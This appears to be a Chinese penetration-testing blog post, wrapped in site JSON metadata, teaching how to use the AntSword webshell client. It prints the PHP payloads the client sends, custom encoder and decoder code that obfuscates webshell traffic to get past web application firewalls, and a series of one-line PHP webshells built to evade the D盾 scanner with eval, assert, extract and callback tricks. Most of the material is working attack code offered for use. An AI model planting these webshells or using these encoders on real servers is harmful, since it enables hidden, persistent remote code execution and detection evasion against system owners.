123456789101112131415161718192021222324252627282930313233343536@ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0);function asenc($out)&#123; return $out;&#125;;function asoutput()&#123; $output=ob_get_contents(); ob_end_clean(); echo &quot;595fa0323f&quot;; echo @asenc($output); echo&quot;da825&quot;;&#125;ob_start();try&#123; $D=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]); if($D==&quot;&quot;) $D=dirname($_SERVER[&quot;PATH_TRANSLATED&quot;]); $R=&quot;&#123;$D&#125; &quot;; if(substr($D,0,1)!=&quot;/&quot;)&#123; foreach(range(&quot;C&quot;,&quot;Z&quot;)as $L) if(is_dir(&quot;&#123;$L&#125;:&quot;)) $R.=&quot;&#123;$L&#125;:&quot;; &#125;else&#123; $R.=&quot;/&quot;; &#125; $R.=&quot; &quot;; $u=(function_exists(&quot;posix_getegid&quot;))?@posix_getpwuid(@posix_geteuid()):&quot;&quot;; $s=($u)?$u[&quot;name&quot;]:@get_current_user(); $R.=php_uname(); $R.=&quot; &#123;$s&#125;&quot;; echo $R;;&#125; catch(Exception $e)&#123; echo &quot;ERROR://&quot;.$e-&gt;getMessage();&#125;;asoutput();die(); 查看php文件 123456789101112131415161718192021222324@ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0);function asenc($out)&#123; return $out;&#125;;function asoutput()&#123; $output=ob_get_contents(); ob_end_clean(); echo &quot;7545b34&quot;; echo @asenc($output); echo &quot;644b58cc3bac&quot;;&#125;ob_start();try&#123; $F=base64_decode($_POST[&quot;x7e381bdf1773a&quot;]); $P=@fopen($F,&quot;r&quot;); echo(@fread($P,filesize($F)?filesize($F):4096)); @fclose($P);;&#125;catch(Exception $e)&#123; echo &quot;ERROR://&quot;.$e-&gt;getMessage();&#125;;asoutput();die();&amp;x7e381bdf1773a=RTovcGhwc3R1ZHkvcGhwc3R1ZHlfcHJvL1dXVy9zcWxpMS9MZXNzLTEvaW5kZXgucGhw 蚁剑使用–Bypass Waf修改蚁剑UA全局设置中添加请求头 单独的webshell添加请求头 修改源代码在项目路径.modules/request.js中进行修改: 另外项目路径下的.modules/update.js也需要修改： 使用Multipart发包 数据会以post的表单形式发送。 编码器编码器的作用当使用蚁剑控制webshell向服务器发送数据包时，数据包中的body部分会按照编码器中定义的规则进行编码或者加密后在发送，这样就可以避免有比较明显的命令执行特征从儿被WAF拦截。 蚁剑的编码器规则以下规则就是蚁剑的默认编码规则，如图： 1234567891011121314151617181920212223242526272829303132/** * php::base64编码器 * Create at: 2020/08/19 7:30:36 */&#x27;use strict&#x27;;/** @param &#123;String&#125; pwd 连接密码* @param &#123;Array&#125; data 编码器处理前的 payload 数组* @return &#123;Array&#125; data 编码器处理后的 payload 数组*/module.exports = (pwd, data, ext=&#123;&#125;) =&gt; &#123; // ########## 请在下方编写你自己的代码 ################### // 以下代码为 PHP Base64 样例 // 生成一个随机变量名 let randomID = `_0x$&#123;Math.random().toString(16).substr(2)&#125;`; // 原有的 payload 在 data[&#x27;_&#x27;]中 // 取出来之后，转为 base64 编码并放入 randomID key 下 data[randomID] = Buffer.from(data[&#x27;_&#x27;]).toString(&#x27;base64&#x27;); // shell 在接收到 payload 后，先处理 pwd 参数下的内容， data[pwd] = `eval(base64_decode($_POST[$&#123;randomID&#125;]));`; // ########## 请在上方编写你自己的代码 ################### // 删除 _ 原有的payload delete data[&#x27;_&#x27;]; // 返回编码器处理后的 payload 数组 return data;&#125; 整个代码是一个module.exports函数，其中有三个参数pwd、data、ext。 pwd: 类型是String, 这个是 shell 的连接密码 data: 类型是 Array, 这个是要发送的 HTTP POST 数据包 ext: 它是个对象，这个是一些扩展参数 在自定义编码方式时只需要去修改data[&#39;_&#39;]中的内容就可以了。 将蚁剑使用burp代理拦截，查看请求。 123456789POST /steady.php HTTP/1.1Host: 127.0.0.1:8888Accept-Encoding: gzip, deflateUser-Agent: antSword/v2.1Content-Type: application/x-www-form-urlencodedContent-Length: 948Connection: close_0xe804371f038f9=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwgIjAiKTtAc2V0X3RpbWVfbGltaXQoMCk7ZnVuY3Rpb24gYXNlbmMoJG91dCl7cmV0dXJuICRvdXQ7fTtmdW5jdGlvbiBhc291dHB1dCgpeyRvdXRwdXQ9b2JfZ2V0X2NvbnRlbnRzKCk7b2JfZW5kX2NsZWFuKCk7ZWNobyAiZTgxZjMyNjlmNjczIjtlY2hvIEBhc2VuYygkb3V0cHV0KTtlY2hvICJiMDkxMTRjNSI7fW9iX3N0YXJ0KCk7dHJ5eyREPWRpcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTtpZigkRD09IiIpJEQ9ZGlybmFtZSgkX1NFUlZFUlsiUEFUSF9UUkFOU0xBVEVEIl0pOyRSPSJ7JER9CSI7aWYoc3Vic3RyKCRELDAsMSkhPSIvIil7Zm9yZWFjaChyYW5nZSgiQyIsIloiKWFzICRMKWlmKGlzX2RpcigieyRMfToiKSkkUi49InskTH06Ijt9ZWxzZXskUi49Ii8iO30kUi49IgkiOyR1PShmdW5jdGlvbl9leGlzdHMoInBvc2l4X2dldGVnaWQiKSk%2FQHBvc2l4X2dldHB3dWlkKEBwb3NpeF9nZXRldWlkKCkpOiIiOyRzPSgkdSk%2FJHVbIm5hbWUiXTpAZ2V0X2N1cnJlbnRfdXNlcigpOyRSLj1waHBfdW5hbWUoKTskUi49Igl7JHN9IjtlY2hvICRSOzt9Y2F0Y2goRXhjZXB0aW9uICRlKXtlY2hvICJFUlJPUjovLyIuJGUtPmdldE1lc3NhZ2UoKTt9O2Fzb3V0cHV0KCk7ZGllKCk7&amp;cmd=eval(base64_decode(%24_POST%5B_0xe804371f038f9%5D))%3B 但是我们看到代码中有eval函数，很容易被waf拦截。接下来我们我们尝试编辑绕过waf。 编码器规则绕过WafBase64编码为了避免waf识别eval等敏感函数，我们可以对其进行base64编码，将cmd的值base64编码也就是对data[pwd]的内容进行base64编码。 这里我们直接把原有的payloadbase64进行编码。 123456&#x2F;&#x2F; ########## 请在下方编写你自己的代码 ###################&#x2F;&#x2F; shell 在接收到 payload 后，先处理 pwd 参数下的内容，data[pwd] &#x3D; Buffer.from(data[&#39;_&#39;]).toString(&#39;base64&#39;);&#x2F;&#x2F; ########## 请在上方编写你自己的代码 ################### 查看一下payload 123456789POST /steady.php HTTP/1.1Host: 127.0.0.1:8888Accept-Encoding: gzip, deflateUser-Agent: antSword/v2.1Content-Type: application/x-www-form-urlencodedContent-Length: 868Connection: closecmd=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwgIjAiKTtAc2V0X3RpbWVfbGltaXQoMCk7ZnVuY3Rpb24gYXNlbmMoJG91dCl7cmV0dXJuICRvdXQ7fTtmdW5jdGlvbiBhc291dHB1dCgpeyRvdXRwdXQ9b2JfZ2V0X2NvbnRlbnRzKCk7b2JfZW5kX2NsZWFuKCk7ZWNobyAiNTY0OTUzNGQiO2VjaG8gQGFzZW5jKCRvdXRwdXQpO2VjaG8gIjliN2FiZSI7fW9iX3N0YXJ0KCk7dHJ5eyREPWRpcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTtpZigkRD09IiIpJEQ9ZGlybmFtZSgkX1NFUlZFUlsiUEFUSF9UUkFOU0xBVEVEIl0pOyRSPSJ7JER9CSI7aWYoc3Vic3RyKCRELDAsMSkhPSIvIil7Zm9yZWFjaChyYW5nZSgiQyIsIloiKWFzICRMKWlmKGlzX2RpcigieyRMfToiKSkkUi49InskTH06Ijt9ZWxzZXskUi49Ii8iO30kUi49IgkiOyR1PShmdW5jdGlvbl9leGlzdHMoInBvc2l4X2dldGVnaWQiKSk%2FQHBvc2l4X2dldHB3dWlkKEBwb3NpeF9nZXRldWlkKCkpOiIiOyRzPSgkdSk%2FJHVbIm5hbWUiXTpAZ2V0X2N1cnJlbnRfdXNlcigpOyRSLj1waHBfdW5hbWUoKTskUi49Igl7JHN9IjtlY2hvICRSOzt9Y2F0Y2goRXhjZXB0aW9uICRlKXtlY2hvICJFUlJPUjovLyIuJGUtPmdldE1lc3NhZ2UoKTt9O2Fzb3V0cHV0KCk7ZGllKCk7 可以看到对payload直接进行base64编码，但是如果waf的检测机制是解码payload然后在进行检测，就无法绕过。所以我们需要自定义一些编码机制，来绕过waf。 rot13rot13 的 js 实现 123456789const rot13encode = (s) =&gt; &#123; return s.replace(/[a-zA-Z]/g, function (c) &#123; return String.fromCharCode((c &lt;= &quot;Z&quot; ? 90 : 122) &gt;= (c = c.charCodeAt(0) + 13) ? c : c - 26); &#125;);&#125; 1234567891011const rot13encode = (s) =&gt; &#123; return s.replace(/[a-zA-Z]/g, function (c) &#123; return String.fromCharCode((c &lt;= &quot;Z&quot; ? 90 : 122) &gt;= (c = c.charCodeAt(0) + 13) ? c : c - 26); &#125;);&#125;data[pwd] = Buffer.from(rot13encode(data[&#x27;_&#x27;])).toString(); 最终发送payload 123456789POST /steady.php HTTP/1.1Host: 127.0.0.1:8888Accept-Encoding: gzip, deflateUser-Agent: antSword/v2.1Content-Type: application/x-www-form-urlencodedContent-Length: 992Connection: closecmd=%40vav_frg(%22qvfcynl_reebef%22%2C%20%220%22)%3B%40frg_gvzr_yvzvg(0)%3Bshapgvba%20nfrap(%24bhg)%7Berghea%20%24bhg%3B%7D%3Bshapgvba%20nfbhgchg()%7B%24bhgchg%3Dbo_trg_pbagragf()%3Bbo_raq_pyrna()%3Brpub%20%2267p814%22%3Brpub%20%40nfrap(%24bhgchg)%3Brpub%20%22132nr0pso07%22%3B%7Dbo_fgneg()%3Bgel%7B%24Q%3Dqveanzr(%24_FREIRE%5B%22FPEVCG_SVYRANZR%22%5D)%3Bvs(%24Q%3D%3D%22%22)%24Q%3Dqveanzr(%24_FREIRE%5B%22CNGU_GENAFYNGRQ%22%5D)%3B%24E%3D%22%7B%24Q%7D%09%22%3Bvs(fhofge(%24Q%2C0%2C1)!%3D%22%2F%22)%7Bsbernpu(enatr(%22P%22%2C%22M%22)nf%20%24Y)vs(vf_qve(%22%7B%24Y%7D%3A%22))%24E.%3D%22%7B%24Y%7D%3A%22%3B%7Dryfr%7B%24E.%3D%22%2F%22%3B%7D%24E.%3D%22%09%22%3B%24h%3D(shapgvba_rkvfgf(%22cbfvk_trgrtvq%22))%3F%40cbfvk_trgcjhvq(%40cbfvk_trgrhvq())%3A%22%22%3B%24f%3D(%24h)%3F%24h%5B%22anzr%22%5D%3A%40trg_pheerag_hfre()%3B%24E.%3Dcuc_hanzr()%3B%24E.%3D%22%09%7B%24f%7D%22%3Brpub%20%24E%3B%3B%7Dpngpu(Rkprcgvba%20%24r)%7Brpub%20%22REEBE%3A%2F%2F%22.%24r-%3EtrgZrffntr()%3B%7D%3Bnfbhgchg()%3Bqvr()%3B 任何你能想到的字符串变换的方式，你都可以自由使用，互相随意组合，打造一款属于你自己的无特征的编码器。 编码器限制由于蚁剑只会对data[pwd]里面的参数按照设定的编码器编码，其它参数默认使用base64编码，所以其它参数一旦被waf解码还是会有明显的特征，从而导致被拦截。 解决办法是遍历data[_]取出其中的值并将其全部编码。 1234567891011121314151617181920212223242526&#x2F;** * php::base64编码器 * Create at: 2020&#x2F;05&#x2F;21 13:07:23 *&#x2F;&#39;use strict&#39;;&#x2F;** @param &#123;String&#125; pwd 连接密码* @param &#123;Array&#125; data 编码器处理前的 payload 数组* @return &#123;Array&#125; data 编码器处理后的 payload 数组*&#x2F;module.exports &#x3D; (pwd, data) &#x3D;&gt; &#123; ########## 请在下方编写你自己的代码 ################### for (let _ in data)&#123; if (_ &#x3D;&#x3D;&#x3D; &#39;_&#39;) &#123; continue &#125;; ret[_] &#x3D; Buffer.from(data[_]).toString(&#39;base64&#39;); ret[_] &#x3D; &#39;steady&#39; + ret[_]; ret[_] +&#x3D; &#39;steady&#39;; &#125; ret[pwd] &#x3D; Buffer.from(data[&#39;_&#39;]).toString(&#39;base64&#39;); ret[pwd] &#x3D; &#39;steady&#39; + ret[pwd]; ret[pwd] +&#x3D; &#39;steady&#39;; &#x2F;&#x2F; 返回编码器处理后的 payload 数组 return ret; ########## 请在下方编写你自己的代码 ###################&#125; 可以看到并没有对其他参数进行编码，而是向其他参数加入了一下自定义的字符串。 解码器蚁剑的编码器是编码或者加密蚁剑向服务端发送的请求包的，所以解码器是用来编码或者加密服务端返回给蚁剑的数据包的，编码后的数据包只有蚁剑能够解码。有些waf会检测返回包，所以有时也需要使用解码器。 使用编码器 使用base64，返回的数据被加密成base64。 不使用编码器 可以看到返回包是明文。 解码器分析12345678910111213141516171819202122232425262728/** * php::base64解码器 * Create at: 2020/05/22 10:21:48 */&#x27;use strict&#x27;;module.exports = &#123; /** * @returns &#123;string&#125; asenc 将返回数据base64编码 * 自定义输出函数名称必须为 asenc * 该函数使用的语法需要和shell保持一致 */ asoutput: () =&gt; &#123; return `function asenc($out)&#123; return @base64_encode($out); &#125; `.replace(/\\n\\s+/g, &#x27;&#x27;); &#125;, /** * 解码 Buffer * @param &#123;string&#125; data 要被解码的 Buffer * @returns &#123;string&#125; 解码后的 Buffer */ decode_buff: (data, ext=&#123;&#125;) =&gt; &#123; return Buffer.from(data.toString(), &#x27;base64&#x27;); &#125;&#125; 两个方法，asoutput及decode_buff。 asoutput无需传入参数，返回一段php代码字符串，名称为asenc的函数，这个函数会放在请求包里，用于在服务端执行完代码后，再回显部分调用该函数asenc来编码处理，所以服务端无需针对解码做改动。 自制编码器主要原理就是在返回的数据包中加入自己的随机字符。 1234567asoutput: () &#x3D;&gt; &#123; return &#96;function asenc($out)&#123; &#x2F;&#x2F;返回时添加一个随机字符串，避免被waf解码成功 return &#39;steady&#39;.@base64_encode($out); &#125; &#96;.replace(&#x2F;\\n\\s+&#x2F;g, &#39;&#39;);&#125;, 对称加密，非对称加密客户端免杀extract 变量覆盖过D盾1&lt;?php $a&#x3D;1;$b&#x3D;$_POST;extract($b);print_r(&#96;$a&#96;)?&gt; post数据a=命令 parse_str 变量覆盖过D盾1&lt;?php $a&#x3D;1;$b&#x3D;&quot;a&#x3D;&quot;.$_GET[&#39;a&#39;];parse_str($b);print_r(&#96;$a&#96;)?&gt; get数据a=命令 __destruct 析构函数过D盾1234567891011121314&lt;?php class User&#123; public $name &#x3D; &#39;&#39;; function __destruct()&#123; eval(&quot;$this-&gt;name&quot;); &#125;&#125;$user &#x3D; new User;$user-&gt;name &#x3D; &#39;&#39;.$_POST[&#39;name&#39;];?&gt; null 拼接过D盾123456789&lt;?php$name &#x3D; $_GET[&#39;name&#39;];$name1&#x3D;$name2&#x3D; null;eval($name1.$name2.$name);?&gt; ‘’ 拼接过D盾123456789&lt;?php$name &#x3D; $_GET[&#39;name&#39;];$name1&#x3D;$name2&#x3D; &#39;&#39;;eval($name1.$name2.$name);?&gt; ‘’ null 拼接过D盾123456&lt;?php$a &#x3D; $_GET[&#39;a&#39;];$c &#x3D; null;eval(&#39;&#39;.$c.$a);?&gt; array_map函数过D盾12345678910&lt;?phpfunction user()&#123;$a123 &#x3D; chr(97).chr(115).chr(115).chr(101).chr(114).chr(116);return &#39;&#39;.$a123;&#125;$a123 &#x3D; user();$x123 &#x3D;array($_GET[&#39;x&#39;]);array_map($a123,$a123 &#x3D; $x123 );?&gt; call_user_func_array函数过D盾123456789&lt;?phpfunction a()&#123; return &#39;assert&#39;;&#125;$a&#x3D;a();$aa &#x3D; array($_GET[&#39;x&#39;]);call_user_func_array($a,$a&#x3D;$aa);?&gt; call_user_func函数过D盾12345678&lt;?phpfunction a()&#123; return &#39;assert&#39;;&#125;$a&#x3D;a();$aa&#x3D;$_GET[&#39;x&#39;];call_user_func($a,$a&#x3D;$aa);?&gt;","categories":[{"name":"渗透工具学习","slug":"渗透工具学习","permalink":"http://s1eady.top/categories/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"渗透工具学习","slug":"渗透工具学习","permalink":"http://s1eady.top/tags/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/"}]}],"categories":[{"name":"内网安全","slug":"内网安全","permalink":"http://s1eady.top/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/"},{"name":"SQL注入","slug":"SQL注入","permalink":"http://s1eady.top/categories/SQL%E6%B3%A8%E5%85%A5/"},{"name":"组件安全","slug":"组件安全","permalink":"http://s1eady.top/categories/%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/"},{"name":"Linux提权","slug":"Linux提权","permalink":"http://s1eady.top/categories/Linux%E6%8F%90%E6%9D%83/"},{"name":"前端安全","slug":"前端安全","permalink":"http://s1eady.top/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"},{"name":"Python学习","slug":"Python学习","permalink":"http://s1eady.top/categories/Python%E5%AD%A6%E4%B9%A0/"},{"name":"CTF-密码","slug":"CTF-密码","permalink":"http://s1eady.top/categories/CTF-%E5%AF%86%E7%A0%81/"},{"name":"渗透工具学习","slug":"渗透工具学习","permalink":"http://s1eady.top/categories/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"内网","slug":"内网","permalink":"http://s1eady.top/tags/%E5%86%85%E7%BD%91/"},{"name":"OWSP-TOP10","slug":"OWSP-TOP10","permalink":"http://s1eady.top/tags/OWSP-TOP10/"},{"name":"组件安全","slug":"组件安全","permalink":"http://s1eady.top/tags/%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/"},{"name":"Linux","slug":"Linux","permalink":"http://s1eady.top/tags/Linux/"},{"name":"Cookie与Session","slug":"Cookie与Session","permalink":"http://s1eady.top/tags/Cookie%E4%B8%8ESession/"},{"name":"Python","slug":"Python","permalink":"http://s1eady.top/tags/Python/"},{"name":"CTF-密码","slug":"CTF-密码","permalink":"http://s1eady.top/tags/CTF-%E5%AF%86%E7%A0%81/"},{"name":"CTF密码","slug":"CTF密码","permalink":"http://s1eady.top/tags/CTF%E5%AF%86%E7%A0%81/"},{"name":"渗透工具学习","slug":"渗透工具学习","permalink":"http://s1eady.top/tags/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/"}]}